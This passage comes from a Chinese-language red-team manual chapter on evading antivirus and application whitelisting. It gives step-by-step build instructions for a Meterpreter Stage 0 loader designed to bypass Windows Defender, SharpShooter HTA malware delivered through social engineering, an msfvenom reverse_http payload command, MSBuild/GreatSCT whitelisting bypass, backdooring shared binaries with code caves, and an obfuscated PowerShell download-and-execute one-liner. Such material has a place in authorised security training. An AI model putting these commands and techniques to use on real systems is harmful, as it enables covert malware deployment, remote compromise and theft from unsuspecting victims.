"C:\Program Files (x86)\GnuWin32\bin\make.exe"
将新创建的二进制文件移动到meterpreter文件夹。
copy metsvc.exe ..\..\..\..\data\meterpreter\。
copy metsvc-server.exe ..\..\..\..\data\meterpreter\。
接下来，修改Meterpreter静荷，使用提供的.bat文件进行编译。
cd metasploit-payloads\c\meterpreter。
make.bat。
编译所有内容后，生成两个文件夹（x86和x64）。将所有已编译的DLL复制到meterpreter文件夹。
copy metasploit-payloads\c\meterpreter\output\x86* metasploit-framework\data\ meterpreter。
copy metasploit-payloads\c\meterpreter\output\x64* metasploit-framework\data\ meterpreter。
这就是服务器版本的meterpreter。我们现在可以将整个metasploit-framework文件夹移动到Kali系统，启动反向HTTPS处理程序（windows/x64/meterpreter/reverse_https）。
7.4.2 创建修改后的Stage 0静荷
我们需要做的最后一件事是创建一个Stage 0静荷，让最开始的可执行文件绕过所有杀毒软件检测。您可能不是很了解，Meterpreter中的Stage 0是任何漏洞利用或静荷的第一阶段。这是一段代码，完成一件很简单的事情：以我们想要的方式（reverse_https、reverse_ tcp和bind_tcp等）回连或者监听，然后接收metsrv.dll文件。然后，加载这个文件并执行。从本质上来讲，任何Stage 0静荷只是一个美化的“下载并执行”静荷。这是Metasploit的所有功能的基础，在许多杀毒软件解决方案中都有针对Metasploit特定行为的高级签名技术和启发式检测方法，甚至修改shellcode并添加垃圾代码，仍然由于启发式检测而被标记。为了解决这个问题，我们编写了自己的Stage 0，执行同样的功能（在内存中下载和执行）：复制Meterpreter的reverse_https静荷的下载代码，从服务器获取metsrv.dll，然后在内存中存储并执行。
此处提供的具体静荷例子，具有一些更复杂的功能。这些静荷实现了位置无关，无须导入函数。这个代码是基于thealpiste的代码进行开发的（https://github.com/thealpiste/ C_ReverseHTTPS_Shellcode）。
提供的示例执行以下操作。
所有代码在内存中定位DLL和函数，实现执行功能；没有使用导入函数。通过手动定义使用的“桩子”函数，在内存中搜索这些函数。
Wininet用于执行HTTPS请求，返回配置后的Metasploit处理程序。
接收metsrv.dll，并执行数据模块。Metasploit提供这些文件，入口点是缓冲区的开头。
此功能实现的过程与msfvenom构建静荷过程是相同的。但是，msfvenom将这个过程添加到生成可执行文件模板中，采用的是可预测和检测的方式，但是不可配置。因此，大多数杀毒软件能够识别这些可执行文件。相反，通过一些编码技术，您可以重新设计静荷的功能，因为静荷很小，并且可以绕过当前存在的杀毒软件检测。在撰写本书时，静荷可以规避所有杀毒软件，包括Windows Defender。
创建静荷过程如下所示。
在Visual Studio 13中，打开metasploit-payloads\c\x64_defender_bypass\x64_defender_ bypass.vcxproj。
在x64_defender_bypass下有一个settings.h文件。打开该文件，修改HOST和PORT信息为Meterpreter处理程序信息。
确保编译设置为“Release”并编译“x64”。
保存并构建。
在metasploit-payloads\c\x64_defender_bypass\x64\Release下，创建一个新的二进制文件“x64_defender_bypass.exe”。在运行Windows Defender的被攻击计算机上执行此载荷。在构建此项目时，Windows Defender未检测到这个静荷。
您现在拥有一个深度混淆的Meterpreter二进制文件，传输层也进行混淆，绕过所有默认的保护机制。现在，这只是一个入门的原型系统。本书发行后，其中一些技术会被检测生成签名。您还可以采取更多的措施，规避检测工具。例如，您可以进行如下操作。
使用Clang混淆工具链编译。
对所有字符串使用字符串加密库。
更改Meterpreter入口点（当前为Init）。
创建自动脚本，为所有静荷类型添加nops。
编辑使用的Ruby脚本，生成静荷，静荷每次运行时都进行随机化。
7.5 SharpShooter
作为红队，较耗时的工作之一是创建静荷，规避下一代杀毒软件和沙箱。我们一直在寻找新的方法，创建初始入口。一个名为SharpShooter的工具采用了许多反沙箱技术，James Forshaw编写的DotNetToJScript可用来执行Windows脚本格式的shellcode（CACTUSTORCH工具见GitHub相关网页）。
MDSec网站介绍了SharpShooter：“SharpShooter支持分阶段和无阶段静荷执行。分阶段执行可以采用HTTP(S)、DNS或两者进行传输。当执行分阶段静荷时，它尝试检索C Sharp压缩的源代码文件，然后使用所选择的传递技术，进行base64编码。下载C Sharp项目源代码，在主机上使用.NET CodeDom编译器进行编译。然后，使用反射方法从源代码执行所需的方法。”
下面我们看一个简单的例子。
python SharpShooter.py --interactive。
1 - 适用于.NET v2。
Y - 分阶段静荷。
1 - HTA 静荷。
您可以选择技术，成功绕过沙箱，执行恶意软件。提供以下防沙箱技术。 
域的密钥
确保加入域名
检查沙箱
检查错误的MAC
检查调试
1 - 网络传递。
Y - 内置shellcode模板。
shellcode作为字节数组。 
打开一个新终端，创建一个csharp Meterpreter静荷
msfvenom -a x86 -p windows/meterpreter/reverse_http LHOST=10.100.100.9 LPORT= 8080 EnableStageEncoding=True StageEncoder=x86/shikata_ga_nai -f csharp
复制“{”和“}”之间的所有内容，采用字节数组形式提交
为CSharp网络传递提供URI。 
输入攻击者的IP/端口和文件
提供输出文件的名称。 
恶意软件
Y—您想要在HTML内部添加内容吗？
使用自定义（1）或预定义（2）模板。 
要进行测试，可选择任何预定义模板
将新创建的恶意文件移动到您的网站目录。 
mv output/* /var/www/html/
为静荷设置Meterpreter处理程序。
配置和开发恶意软件后，将其移至Web目录（malware.hta、malware.html、malware. payload），启动Apache 2服务，然后启动Meterpreter处理程序。现在采用社会工程学方法，引诱被攻击者访问恶意网站！上面给出的示例是SharpShooter的SharePoint在线模板。当被攻击者使用IE/Edge访问您的恶意页面时，HTA会自动下载并提示运行。弹出窗口后，如果选择运行，将运行静荷，下载第二静荷（如果规避沙箱监控），并在内存中执行Meterpreter静荷，如图7.2所示。
图7.2
7.6 应用程序白名单规避
我们已经讨论了在不运行PowerShell代码的情况下触发PowerShell的不同方法，但如果您无法在Windows系统上运行自定义二进制文件，该怎么办？应用程序规避的原理是找到默认的Windows二进制文件，执行静荷。我们登录类似域控制器设备，但是系统被锁定，代码执行受到限制。我们可以使用不同的Windows文件来绕过这些限制，让我们来看看其中的几个文件。
一个经常被讨论的Windows二进制文件是MSBuild.exe，实现绕过应用程序白名单。什么是MSBuild.exe，它有什么作用？MSBuild是.NET Framework中的默认应用程序，使用XML格式的项目文件，构建.NET应用程序。我们可以利用这个功能，使用名为GreatSCT的工具，创建自己的恶意XML项目文件，执行Meterpreter会话。
GreatSCT（见GitHub中的GreatSCT网页）包括各种应用程序白名单绕过方法，这里我们只介绍MSBuild。在这个例子中，我们创建恶意的XML文件，该文件承载一个reverse_http Meterpreter会话。这将要求我们在被攻击系统中写入XML文件，使用MSBuild执行XML文件，如图7.3所示。
git clone https://github.com/GreatSCT/GreatSCT.git /opt/。
cd /opt/GreatSCT。
python3 ./gr8sct.py。
[4] MSBUILD/msbuild.cfg。
图7.3
Enter your host IP [0] and port [1]输入主机ZP地址和端口。
generate创建文件。
在Metasploit中创建windows/meterpreter/reverse_http handles。
在Kali实例中，我们使用GreatSCT创建shellcode.xml文件，该文件包含构建信息和Meterpreter反向HTTP Shell。需要将此文件移动到被攻击系统，并使用MSBuild进行调用，如图7.4所示。
图7.4
注意：我确实看到GreatSCT正在“开发”分支（见GitHub中GreatSCT页面的tree/develop子页面）上积极构建，其中包括HTTPS Meterpreter和其他白名单绕过机制。我猜测在本书出版之后，它将被转移到“主版本”。
一旦在被攻击的计算机的Windows上具备执行权限，使用命令“C:\Windows\Microsoft. NET\Framework\v4.0.30319\MSBuild.exe shellcode.xml”，.NET将开始构建shellcode.xml文件。在这个过程中，被攻击的计算机将生成反向HTTP Meterpreter会话，绕过任何应用白名单机制，如图7.5所示。您可能希望编辑shellcode.xml文件，放入混淆的静荷，因为默认的Meterpreter很可能会触发杀毒软件。
有许多不同的方法可以绕过应用程序白名单机制，这些方程足够编写为一本书。
图7.5
7.7 代码洞穴
与任何红队活动一样，我们一直在寻找富有创造性的方式，在环境中横向移动或长期控制。通常情况下，如果掌握凭证，我们就会尝试使用WMI或PsExec在远程系统上执行静荷。有时，我们需要采用富有创造性的方式，在一个环境中移动而不被轻易跟踪。
作为红队，在行动中被发现，可能并不是最糟糕的事情。最糟糕的事情是被发现，并且蓝队发现行动中的域名、IP地址和突破的主机。蓝队通过查看WMI/PsExec连接，识别横向移动，因为这些流量看起来不是正常的流量。那么，我们可以做些什么来隐藏横向移动呢？
这是我们发挥创造力的地方，并且没有正确的答案（如果有效，那么对我来说已经足够了）。我最喜欢做的事情就是在环境中发现共享目录和主动共享/执行的文件。我们可以尝试在Office文件中添加宏，但这可能太明显了。将定制恶意软件嵌入可执行二进制文件，这种攻击方式被发现的概率较低，成功率高。这可以是类似PuTTY的共享二进制文件，一个常见的内部胖客户端，甚至是数据库工具。
执行这些攻击的一个简单工具是Backdoor Factory，虽然它不再维护。Backdoor Factory在真实程序中查找代码洞或空块，攻击者可以在其中注入自己的恶意shellcode。本书第2版介绍了这项技术。
7.8 PowerShell混淆
PowerShell 脚本现在的问题是，如果您将脚本放到磁盘上，那么很多杀毒软件都会查杀脚本。即使您将脚本导入内存，杀毒软件通过查看内存，也可能发出警报。
无论如何，如果您从Cobalt Strike、Meterpreter或PowerShell Empire将脚本导入内存，那么需确保不会被杀毒软件发现。如果我们将脚本导入内存，那么至少应急响应/取证团队应该很难逆向分析我们的攻击静荷。
让我们来查看PowerShell的命令，如下所示。
Powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString('[PowerShell URL]'); [Parameters]。
这是我们看到的最基本的字符串组合，可以绕过执行策略，隐藏运行/非交互，以及下载和执行PowerShell静荷。对于蓝队，我们已经看到有很多日志，记录这些特定的参数，例如“-Exec Bypass”。因此，我们通过一些常见的PowerShell语法混淆这些参数。
-ExecutionPolicy Bypass。 
-EP Bypass
-Exec Bypass
-Execution Bypass
更疯狂的是，我相信Daniel Bohannon识别出了这个，您根本不需要完整的字符串来完成上述操作。例如，对于-ExecutionPolicy Bypass，以下的这些例子都将能正常工作。
-ExecutionPolicy Bypass。
-ExecutionPol Bypass。